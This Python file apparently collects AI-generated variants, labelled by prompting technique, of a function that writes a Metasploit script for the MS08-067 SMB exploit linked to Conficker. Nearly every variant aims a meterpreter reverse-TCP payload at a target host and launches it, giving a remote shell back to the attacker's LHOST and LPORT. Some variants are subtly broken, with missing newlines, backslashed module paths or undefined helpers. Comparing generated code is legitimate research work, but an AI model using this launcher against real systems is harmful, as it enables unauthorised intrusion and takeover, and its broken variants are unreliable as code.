import re
import ipaddress

def ground_truth_code_confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

def persona__confickerExploit(configFile, tgtHost, lhost, lport):
	with open(configFile, 'w') as f:
		f.write('use exploit/windows/smb/ms08_067_netapi\n')
		f.write('set RHOST ' + str(tgtHost) + '\n')
		f.write('set payload windows/meterpreter/reverse_tcp\n')
		f.write('set LPORT ' + str(lport) + '\n')
		f.write('set LHOST ' + lhost + '\n')
		f.write('exploit -j -z\n')

def template__confickerExploit(configFile, tgtHost, lhost, lport):
	try:
		with open(configFile, 'w') as file:
			file.write('use exploit/windows/smb/ms08_067_netapi\n')
			file.write('set RHOST '+ str(tgtHost) +'\n')
			file.write('set payload windows/meterpreter/reverse_tcp\n')
			file.write('set LPORT '+ str(lport) +'\n')
			file.write('set LHOST '+ lhost +'\n')
			file.write('exploit -j -z\n')
	except Exception as e:
		pass

def question_refinement__confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        tgtHost = ''.join(e for e in tgtHost if e.isalnum() or e in '.-')
        lhost = ''.join(e for e in lhost if e.isalnum() or e in '.-')
        lport = ''.join(e for e in str(lport) if e.isdigit())
        with open(configFile, 'w') as f:
            f.write('use exploit/windows/smb/ms08_067_netapi\n')
            f.write('set RHOST {}\n'.format(tgtHost))
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write('set LPORT {}\n'.format(lport))
            f.write('set LHOST {}\n'.format(lhost))
            f.write('exploit -j -z\n')
    except IOError as e:
        pass

def alternative_approaches__confickerExploit(configFile, tgtHost, lhost, lport):
	lines = ['use exploit/windows/smb/ms08_067_netapi', 'set RHOST ' + str(tgtHost), 'set payload windows/meterpreter/reverse_tcp', 'set LPORT ' + str(lport), 'set LHOST ' + lhost, 'exploit -j -z']
	if not isinstance(tgtHost, (str, int)) or not tgtHost:
		raise ValueError('Invalid tgtHost')
	if not isinstance(lhost, str) or not lhost:
		raise ValueError('Invalid lhost')
	if not isinstance(lport, int) or lport < 0:
		raise ValueError('Invalid lport')
	try:
		with open(configFile, 'w') as f:
			f.writelines([line + '\n' for line in lines])
	except IOError as e:
		raise IOError(f'Error writing to {configFile}: {e}')

def context_manager__confickerExploit(configFile, tgtHost, lhost, lport):
	lines = ['use exploit/windows/smb/ms08_067_netapi\n', 'set RHOST ' + tgtHost + '\n', 'set payload windows/meterpreter/reverse_tcp\n', 'set LPORT ' + str(lport) + '\n', 'set LHOST ' + lhost + '\n', 'exploit -j -z\n']
	with open(configFile, 'w') as f:
		f.writelines(lines)

def flipped_interaction_3__write_config_file(configFile, tgtHost, lhost, lport):
    if not is_valid_target(tgtHost):
        logging.error(f"Invalid tgtHost: {tgtHost}")
        return "Error: Invalid tgtHost."
    if not is_valid_target(lhost):
        logging.error(f"Invalid lhost: {lhost}")
        return "Error: Invalid lhost."
    if not is_valid_port(lport):
        logging.error(f"Invalid lport: {lport}")
        return "Error: Invalid lport."
    lines = [
        f'Target Host: {tgtHost}\n',
        f'Local Host: {lhost}\n',
        f'Local Port: {lport}\n'
    ]
    if os.path.exists(configFile):
        logging.warning(f'The file {configFile} already exists and will be overwritten.')
    try:
        with open(configFile, 'w', encoding='utf-8') as file:
            file.writelines(lines)
        logging.info(f'Configuration file {configFile} has been written successfully.')
        return f'Success: Configuration file {configFile} has been written successfully.'
    except (IOError, OSError) as e:
        logging.error(f'An error occurred while writing to the file {configFile}: {e}')
        return f'Error: An error occurred while writing to the file {configFile}: {e}'

def flipped_interaction_4__confickerExploit(configFile, tgtHost, lhost, lport):
    if not isinstance(tgtHost, str) or not tgtHost:
        raise ValueError('tgtHost must be a non-empty string')
    if not isinstance(lhost, str) or not lhost:
        raise ValueError('lhost must be a non-empty string')
    if not isinstance(lport, int) or not (1 <= lport <= 65535):
        raise ValueError('lport must be an integer between 1 and 65535')
    with open(configFile, 'w') as f:
        f.write('use exploit/windows/smb/ms08_067_netapi\n')
        f.write('set RHOST {}'.format(tgtHost))
        f.write('set payload windows/meterpreter/reverse_tcp')
        f.write('set LPORT {}'.format(lport))
        f.write('set LHOST {}'.format(lhost))
        f.write('exploit -j -z')

def flipped_interaction_5__confickerExploit(configFile, tgtHost, lhost, lport, mode='w', errorLogPath=None):
    try:
        ipaddress.IPv4Address(tgtHost)
        ipaddress.IPv4Address(lhost)
        lport = int(lport)
        if not (1 <= lport <= 65535):
            raise ValueError('ERROR: Port number out of range')
        lines = ['use exploit/windows/smb/ms08_067_netapi\n', f'set RHOST {tgtHost}\n', 'set payload windows/meterpreter/reverse_tcp\n', f'set LPORT {lport}\n', f'set LHOST {lhost}\n', 'exploit -j -z\n']
        with open(configFile, mode) as file:
            file.writelines(lines)
    except ipaddress.AddressValueError:
        error_message = 'ERROR: Invalid IP address'
        print(error_message)
        if errorLogPath:
            with open(errorLogPath, 'a') as error_log:
                error_log.write(error_message + '\n')
    except ValueError as ve:
        error_message = str(ve)
        print(error_message)
        if errorLogPath:
            with open(errorLogPath, 'a') as error_log:
                error_log.write(error_message + '\n')
    except Exception as e:
        error_message = f'ERROR: An unexpected error occurred - {str(e)}'
        print(error_message)
        if errorLogPath:
            with open(errorLogPath, 'a') as error_log:
                error_log.write(error_message + '\n')

def iterative_prompting_3__confickerExploit(configFile, tgtHost, lhost, lport):
    if not isinstance(configFile, str) or not configFile:
        raise ValueError('configFile must be a non-empty string')
    if not isinstance(tgtHost, str) or not tgtHost:
        raise ValueError('tgtHost must be a non-empty string')
    if not isinstance(lhost, str) or not lhost:
        raise ValueError('lhost must be a non-empty string')
    if not isinstance(lport, int) or lport < 1 or lport > 65535:
        raise ValueError('lport must be an integer between 1 and 65535')
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit\\windows\\smb\\ms08_067_netapi\n')
            file.write('set RHOST ' + str(tgtHost) + '\n')
            file.write('set payload windows\\meterpreter\\reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
    except IOError as e:
        raise IOError('Error writing to file: ' + str(e))

def iterative_prompting_4__confickerExploit(config_file, tgt_host, lhost, lport):
    if not isinstance(config_file, str) or not config_file.strip():
        raise ValueError('config_file must be a non-empty string')
    if not isinstance(tgt_host, str) or not tgt_host.strip():
        raise ValueError('tgt_host must be a non-empty string')
    if not isinstance(lhost, str) or not lhost.strip():
        raise ValueError('lhost must be a non-empty string')
    if not isinstance(lport, int) or lport < 1 or lport > 65535:
        raise ValueError('lport must be an integer between 1 and 65535')
    try:
        with open(config_file, 'w') as f:
            f.write('use exploit\\windows\\smb\\ms08_067_netapi\n')
            f.write('set RHOST ' + tgt_host.strip() + '\n')
            f.write('set payload windows\\meterpreter\\reverse_tcp\n')
            f.write('set LPORT ' + str(lport) + '\n')
            f.write('set LHOST ' + lhost.strip() + '\n')
            f.write('exploit -j -z\n')
    except IOError as e:
        raise IOError('Failed to write to ' + config_file) from e

def iterative_prompting_5__confickerExploit(configFile, tgtHost, lhost, lport):
    if not isinstance(configFile, str):
        raise ValueError('configFile must be a string')
    if not tgtHost or not isinstance(tgtHost, str):
        raise ValueError('tgtHost must be a non-empty string')
    if not lhost or not isinstance(lhost, str):
        raise ValueError('lhost must be a non-empty string')
    if not isinstance(lport, int) or lport < 0 or lport > 65535:
        raise ValueError('lport must be an integer between 0 and 65535')
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit\\windows\\smb\\ms08_067_netapi\n')
            file.write('set RHOST ' + str(tgtHost) + '\n')
            file.write('set payload windows\\meterpreter\\reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
    except IOError as e:
        raise IOError('Error writing to configuration file: ' + str(e))

def few_shots_prompting__confickerExploit(configFile, tgtHost, lhost, lport):
	with open(configFile, 'w') as f:
		f.write('use exploit/windows/smb/ms08_067_netapi\n')
		f.write('set RHOST ' + str(tgtHost) + '\n')
		f.write('set payload windows/meterpreter/reverse_tcp\n')
		f.write('set LPORT ' + str(lport) + '\n')
		f.write('set LHOST ' + lhost + '\n')
		f.write('exploit -j -z\n')

def cot_prompting__confickerExploit(configFile, tgtHost, lhost, lport):
    config_lines = ['use exploit/windows/smb/ms08_067_netapi\n', 'set RHOST ' + str(tgtHost) + '\n', 'set payload windows/meterpreter/reverse_tcp\n', 'set LPORT ' + str(lport) + '\n', 'set LHOST ' + lhost + '\n', 'exploit -j -z\n']
    with open(configFile, 'w') as file:
        file.writelines(config_lines)

def fact_check_list__confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as config:
        config.write('use exploit/windows/smb/ms08_067_netapi\n')
        config.write(f'set RHOST {tgtHost}\n')
        config.write('set payload windows/meterpreter/reverse_tcp\n')
        config.write(f'set LPORT {lport}\n')
        config.write(f'set LHOST {lhost}\n')
        config.write('exploit -j -z\n')

def not_interactive_mix__confickerExploit(configFile, tgtHost, lhost, lport):
    ipv4_pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    if not re.match(ipv4_pattern, tgtHost):
        raise ValueError("tgtHost must be a valid IPv4 address")
    if not isinstance(lport, int) or not (0 <= lport <= 65535):
        raise ValueError("lport must be an integer between 0 and 65535")
    if not re.match(ipv4_pattern, lhost):
        raise ValueError("lhost must be a valid IPv4 address")
    if not isinstance(configFile, str) or not configFile:
        raise ValueError("configFile must be a non-empty string")
    config_lines = [
        'use exploit/windows/smb/ms08_067_netapi\n',
        f'set RHOST {tgtHost}\n',
        'set payload windows/meterpreter/reverse_tcp\n',
        f'set LPORT {lport}\n',
        f'set LHOST {lhost}\n',
        'exploit -j -z\n'
    ]
    try:
        with open(configFile, 'w') as file:
            file.writelines(config_lines)
    except Exception as e:
        raise IOError(f"An error occurred while writing to the file: {e}")

def interactive_mix__confickerExploit(configFile, tgtHost, lhost, lport):
    if not re.match(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){2}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$', tgtHost):
        if not re.match(r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$', tgtHost):
            raise ValueError("tgtHost must be a valid IP address or domain name.")
    if not re.match(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){2}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$', lhost):
        raise ValueError("lhost must be a valid IP address.")
    if not isinstance(lport, int) or not (1 <= lport <= 65535):
        raise ValueError("lport must be an integer between 1 and 65535.")
    if not hasattr(configFile, 'write') or not callable(configFile.write):
        raise ValueError("configFile must be a file object opened in write mode.")
    configLines = [
        'use exploit/windows/smb/ms08_067_netapi\n',
        f'set RHOST {tgtHost}\n',
        'set payload windows/meterpreter/reverse_tcp\n',
        f'set LPORT {lport}\n',
        f'set LHOST {lhost}\n',
        'exploit -j -z\n'
    ]
    try:
        configFile.writelines(configLines)
    except IOError as e:
        raise IOError(f"An error occurred while writing to the configFile: {e}")
    except Exception as e:
        raise Exception(f"An unexpected error occurred: {e}")

def baseline__confickerExploit(configFile, tgtHost, lhost, lport):
	with open(configFile, 'w') as f:
		f.write('use exploit/windows/smb/ms08_067_netapi\n')
		f.write('set RHOST ' + str(tgtHost) + '\n')
		f.write('set payload windows/meterpreter/reverse_tcp\n')
		f.write('set LPORT ' + str(lport) + '\n')
		f.write('set LHOST ' + lhost + '\n')
		f.write('exploit -j -z\n')
